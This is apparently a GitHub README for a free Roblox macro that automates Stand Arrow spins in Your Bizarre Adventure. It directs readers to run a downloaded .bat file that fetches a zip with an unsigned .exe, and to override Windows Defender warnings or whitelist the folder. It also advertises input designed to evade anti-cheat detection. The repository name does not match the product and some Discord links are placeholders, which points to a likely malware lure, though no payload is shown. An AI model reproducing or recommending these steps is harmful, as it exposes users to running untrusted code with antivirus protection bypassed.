<div align="center">

# 🎰 Stand Arrow Free Macro — Skin Pity Checker

**Spins Stand Arrows automatically and stops the moment your worthiness hits 0 (= you got a skin!).**
Free, no key needed, just download and run.

![Version](https://img.shields.io/badge/version-1.0-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge&logo=windows)
![Status](https://img.shields.io/badge/status-Active-success?style=for-the-badge)
![Price](https://img.shields.io/badge/price-FREE-brightgreen?style=for-the-badge)

---

## ⬇️ Download

<a href="https://github.com/TheWolfLight/free-bizarre-lineage-skin/raw/main/Download_BizarreLineageSkin.bat">
<img src="https://img.shields.io/badge/DOWNLOAD-MACRO-CBA6F7?style=for-the-badge&logo=download&logoColor=white" alt="Download">
</a>

<a href="https://discord.gg/btNHCKbKAn">
<img src="https://img.shields.io/badge/JOIN-DISCORD-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
</a>

</div>

---

## ✨ Features

* 🌀 **Auto Stand Arrow spinning** — opens inventory, searches, clicks, presses M, clicks zone, repeats
* 🎯 **Worthiness pity detection** — uses image comparison on your worthiness number, stops on 0
* 🪟 **Auto-dock Roblox** — automatically resizes Roblox to 1300×900 and snaps it next to the macro window
* 🖱️ **Hardware-level clicks** — uses Windows SendInput so the game registers everything as real input
* 🧠 **Smooth cursor movement** — bezier-curve sliding with jitter, looks human
* 🎨 **Clean dark GUI** — always-on-top tkinter window, dark theme
* 📦 **Pre-configured positions** — comes with positions already set for the standard 1300×900 client
* 🔒 **No license key** — completely free

---

## 📥 Installation

1. Click the **DOWNLOAD MACRO** button above
2. Run the `.bat` file — it will auto-download `StandArrowFreeMacro.zip` to your Desktop
3. **Extract the zip** — you should get a folder with these 4 files:

   ```
   📁 StandArrowFreeMacro/
   ├── 🖥️ StandArrowFreeMacro.exe
   ├── 🖼️ worthiness_zero_ref.png
   ├── ⚙️ macro_config.json
   └── 📄 README.txt
   ```

4. **Keep all 4 files in the same folder!** The `.exe` needs the config and ref image next to it.
5. Double-click `StandArrowFreeMacro.exe` to launch.

> ⚠️ **Windows Defender may flag it** — that's normal for unsigned PyInstaller `.exes`. Click "More info" → "Run anyway" or whitelist the folder.

---

## 🎮 How to Use

### Hotkeys

| Key | Action |
|-----|--------|
| **F1** | ▶️ Start the macro |
| **F2** | 🎯 Right-click on the target zone (where your character spawns the arrow) |
| **F3** | ⏹️ Stop the macro |

### Step-by-step

1. **Open Roblox** and join YBA (Your Bizarre Adventure)
2. **Launch the macro** — Roblox will auto-resize and dock beside the macro window
3. **Press F2**, then **right-click on the zone** where you want the macro to click after spawning the arrow
4. **(Optional)** check the worthiness "0" reference is captured — if not, set the worthiness corners and click `Capture '0'` while your worthiness *is* showing 0
5. **Press F1** to start spinning!
6. The macro will automatically stop when worthiness = 0 (= you got a skin)

---

## 🛠️ How It Works

```
Loop:
  → Press J (open inventory)
  → Click search bar
  → Type "stand arrow"
  → Click stand arrow icon
  → Click Use button 1
  → Click Use button 2
  → Press M (open menu/zone selector)
  → Click target zone
  → Read worthiness number
  → If worthiness == 0 → STOP! 🎉
  → Else → loop again
```

The worthiness check works by **comparing the screen region against a saved "0" reference image** using:
- 🔲 Binary thresholding
- 🔢 Pixel similarity score (>90%)
- 📊 Bright pixel count ratio (between 0.7× and 1.3×)

This makes it way more reliable than OCR for a single digit.

---

## ❓ FAQ

> **Q: Do I need a license key?**
> A: Nope! This version is 100% free.

> **Q: My positions don't work / clicks miss!**
> A: Make sure Roblox is in **windowed mode at 1300×900** (the macro auto-resizes it). If you want different positions, use the **Positions** tab in the GUI to re-set them.

> **Q: The worthiness check doesn't trigger / triggers wrongly!**
> A: Re-capture the "0" reference: set the worthiness corners in the Positions tab, wait until your in-game worthiness *is* 0, then click `Capture '0'`.

> **Q: Does this get me banned?**
> A: Use at your own risk. The macro uses hardware-level input so it's very hard to detect, but no automation is ever truly risk-free.

> **Q: Can I run this on Mac/Linux?**
> A: Windows only — uses Win32 APIs for the Roblox window management.

> **Q: How do I get the paid version with stand/personality/skin filtering?**
> A: Join the [Discord server](https://discord.gg/YOUR_INVITE_HERE) for info on the full paid version.

---

## 🐛 Issues / Bugs?

Open a ticket in our [Discord server](https://discord.gg/YOUR_INVITE_HERE). Include:
- Your screen resolution
- A screenshot of the macro's status
- What step it fails on

---

## ⚠️ Disclaimer

This is a third-party tool, not affiliated with Roblox or YBA. Use at your own risk. Don't blame me if you get banned, your stand gets stolen, or your dog runs away.

---

<div align="center">

**Enjoy the free skins! 🎰✨**

<sub>Made with 💜 by Bizarre Lineage Skin Team</sub>

</div>
